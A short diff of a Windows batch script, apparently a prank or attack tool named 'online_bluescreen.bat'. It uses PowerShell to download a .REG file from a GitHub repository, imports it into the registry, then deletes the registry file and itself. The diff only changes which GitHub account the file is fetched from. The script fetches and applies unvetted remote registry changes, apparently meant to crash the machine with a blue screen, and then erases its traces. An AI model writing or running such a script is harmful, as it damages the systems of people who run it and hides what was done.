@@ -5,7 +5,7 @@ pause
 pause
 pause
 pause
-powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/temp.REG -OutFile temp.REG
+powershell /c Invoke-WebRequest https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/temp.REG -OutFile temp.REG
 temp.REG
 del online_bluescreen.bat
 del temp.REG
